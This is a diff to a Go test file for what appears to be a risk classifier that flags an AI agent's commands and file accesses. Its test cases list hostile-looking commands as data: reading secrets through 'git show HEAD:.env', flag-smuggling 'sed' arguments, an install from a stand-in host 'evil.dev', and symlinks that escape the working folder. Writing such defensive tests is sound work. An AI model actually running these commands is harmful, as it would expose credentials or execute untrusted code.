@@ -77,6 +77,9 @@ func TestRiskyCommands(t *testing.T) {
 		"grep -d recurse token .", "ls -R ..",
 		// Secrets reached without naming a file.
 		"git show HEAD:.env", "git show HEAD:config/secrets.yml", "cat .github/workflows/ci.yml",
+		// Words that a tool would read as flags, and full output that could print a secret.
+		"sed -n 1p --expression=e", "sed -n 1p -f", "cd -", "cd -P src", "git diff", "git diff --cached",
+		"git diff HEAD", "git show HEAD", "git show", "cat -- -x",
 		// A stranger's install scripts.
 		"npm install left-pad", "npm i left-pad", "pnpm add left-pad", "yarn add left-pad", "bun add x",
 		"npm install https://evil.dev/x.tgz", "npm install ./tarball.tgz", "npm install --save-dev x",
@@ -226,6 +229,35 @@ func TestDanglingLinkOutOfTheFolder(t *testing.T) {
 		if got := Classify(Action{Kind: KindEdit, Path: path, Folder: work}).Level; got != models.RiskHigh {
 			t.Errorf("%s = %s", path, got)
 		}
+	}
+}
+
+func TestAbsoluteCdIsFollowed(t *testing.T) {
+	work, _ := links(t)
+	text := "cd " + filepath.Join(work, "sub") + " && cat notes.txt"
+	if got := Classify(Action{Kind: KindCommand, Command: text, Folder: work}).Level; got != models.RiskLow {
+		t.Errorf("got %s", got)
+	}
+	if err := os.Symlink(filepath.Dir(work), filepath.Join(work, "sub", "up")); err != nil {
+		t.Fatal(err)
+	}
+	text = "cd " + filepath.Join(work, "sub") + " && cat up/outside/file.txt"
+	if got := Classify(Action{Kind: KindCommand, Command: text, Folder: work}).Level; got != models.RiskHigh {
+		t.Errorf("a link from the new folder must be judged from there: %s", got)
+	}
+}
+
+func TestDotDotInALinkTargetFollowsTheRealFolder(t *testing.T) {
+	work, outside := links(t)
+	// real -> ../outside, and step -> real/.. is really work's parent when real is a link.
+	if err := os.Symlink(outside, filepath.Join(work, "real")); err != nil {
+		t.Fatal(err)
+	}
+	if err := os.Symlink("real/../secret-spot", filepath.Join(work, "step")); err != nil {
+		t.Fatal(err)
+	}
+	if got := Classify(Action{Kind: KindRead, Path: "step", Folder: work}).Level; got != models.RiskHigh {
+		t.Errorf("got %s", got)
 	}
 }
 
